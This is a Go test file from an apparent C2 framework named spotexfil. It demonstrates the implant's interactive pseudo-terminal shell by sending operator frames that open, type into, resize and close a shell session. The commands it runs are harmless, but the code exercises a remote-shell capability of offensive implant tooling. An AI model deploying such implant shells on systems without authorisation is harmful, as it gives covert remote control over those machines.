//go:build !implantonly

package c2

import (
	"fmt"
	"runtime"
	"testing"
	"time"

	"github.com/sourcefrenchy/spotexfil/internal/protocol"
)

// TestPtyShowcase is a live demonstration of the PTY shell: it drives a
// real pseudo-terminal through the frame pipeline and prints the actual
// terminal traffic. Run with: go test -v -run PtyShowcase ./internal/c2/
func TestPtyShowcase(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("showcase uses unix shell commands")
	}

	imp := NewImplantWithOptions(nil, "showcase-key",
		ImplantOptions{Interval: 20, Quiet: true})
	mgr := imp.getPtyManager()
	t.Cleanup(func() { mgr.close(nil) })

	// drain collects PTY output frames for `d` and returns the decoded text.
	drain := func(d time.Duration) string {
		var out []byte
		deadline := time.Now().Add(d)
		for time.Now().Before(deadline) {
			select {
			case r := <-imp.resultCh:
				f, err := UnmarshalPtyFrame(r.Data)
				if err != nil {
					continue
				}
				if f.Op == PtyOpData {
					b, _ := DecodePtyData(f.Data)
					out = append(out, b...)
				}
			case <-time.After(50 * time.Millisecond):
			}
		}
		return string(out)
	}

	send := func(op string, seq int, data string) {
		msg := &protocol.C2Message{Module: "pty", Args: PtyFrame{
			Op: op, Seq: seq, Cols: 100, Rows: 30, Data: data,
		}.toArgs()}
		imp.handlePtyFrame(msg)
	}

	fmt.Println("\n========== PTY SHOWCASE ==========")

	// 1. Open a 100x30 PTY
	send(PtyOpOpen, 0, "")
	r := <-imp.resultCh
	f, _ := UnmarshalPtyFrame(r.Data)
	fmt.Printf("[operator -> implant] open (cols=100 rows=30)\n")
	fmt.Printf("[implant -> operator] %s\n\n", f.Op)
	if f.Op != PtyOpOpenOK {
		t.Fatalf("open failed: %s", f.Data)
	}
	time.Sleep(300 * time.Millisecond)
	banner := drain(500 * time.Millisecond)
	if banner != "" {
		fmt.Printf("[pty boot output]\n%s\n", banner)
	}

	// 2. Prove it's a REAL terminal, not a pipe
	commands := []string{
		"tty\n",                                   // shows /dev/ttysXXX — pipes can't do this
		"test -t 0 && echo 'stdin IS a tty'\n",    // -t test on fd 0
		"echo \"term=$TERM size=$(stty size)\"\n", // TERM + window size
		"uname -sm\n",
		"echo $((6*7))\n",
	}
	for i, cmd := range commands {
		fmt.Printf("[operator types] %s", cmd)
		send(PtyOpData, i, EncodePtyData([]byte(cmd)))
		out := drain(1200 * time.Millisecond)
		fmt.Printf("[terminal output]\n%s\n", out)
	}

	// 3. Resize the window and prove the shell sees it
	fmt.Printf("[operator resizes window] 132x43\n")
	send(PtyOpResize, 0, "")
	msg := &protocol.C2Message{Module: "pty", Args: PtyFrame{
		Op: PtyOpResize, Cols: 132, Rows: 43,
	}.toArgs()}
	imp.handlePtyFrame(msg)
	send(PtyOpData, 99, EncodePtyData([]byte("stty size\n")))
	fmt.Printf("[terminal output]\n%s\n", drain(1200*time.Millisecond))

	// 4. Close
	send(PtyOpClose, 0, "")
	fmt.Printf("[operator -> implant] close\n")
	fmt.Printf("[session state] alive=%v (expect false)\n", mgr.sessionAlive())
	fmt.Println("==================================")

	if mgr.sessionAlive() {
		t.Error("session should be dead after close")
	}
}
